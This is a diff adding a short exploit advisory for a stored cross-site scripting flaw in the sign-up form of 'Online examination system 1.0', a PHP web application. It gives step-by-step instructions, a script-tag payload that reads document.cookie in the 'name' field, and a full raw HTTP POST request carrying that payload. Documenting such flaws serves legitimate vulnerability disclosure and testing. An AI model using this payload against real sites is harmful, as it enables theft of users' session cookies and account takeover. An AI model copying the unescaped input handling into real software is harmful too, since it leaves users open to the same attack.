@@ -1,0 +1,35 @@
+# Exploit Title: Online examination system 1.0 - 'name' Stored Cross Site Scripting
+# Date: 29/10/2020
+# Exploit Author: Nikhil Kumar (https://www.linkedin.com/in/nikhil-kumar-4b9443166/)
+# Vendor Homepage: https://github.com/projectworldsofficial/online-examination-systen-in-php
+# Software Link: https://github.com/projectworldsofficial/online-examination-systen-in-php.git
+# Version: 1.0
+# Tested On: Ubntu 18 + Xampp-linux-x64-5.5.38-3
+
+Step 1: Open the URL http://localhost/online-examination-systen-in-php/index.php and fill the sign up form 
+
+http://localhost/exam_system/sign.php?q=account.php
+
+Step 2 : Use payload ><script>alert(document.cookie)</script> in "name=" field 
+
+Malicious Request
+-----------------
+
+POST /exam_system/sign.php?q=account.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 157
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/exam_system/index.php
+Cookie: security_level=1; PHPSESSID=kue9gcj3bs2329e8mctsokaod7
+Upgrade-Insecure-Requests: 1
+
+name=test><script>alert(document.cookie)</script>&gender=M&college=test&email=test@test.com&mob=8888888888&password=123456&cpassword=123456
+
+
+Step 3: Cookie will be reflected each time user logged in with their credentials
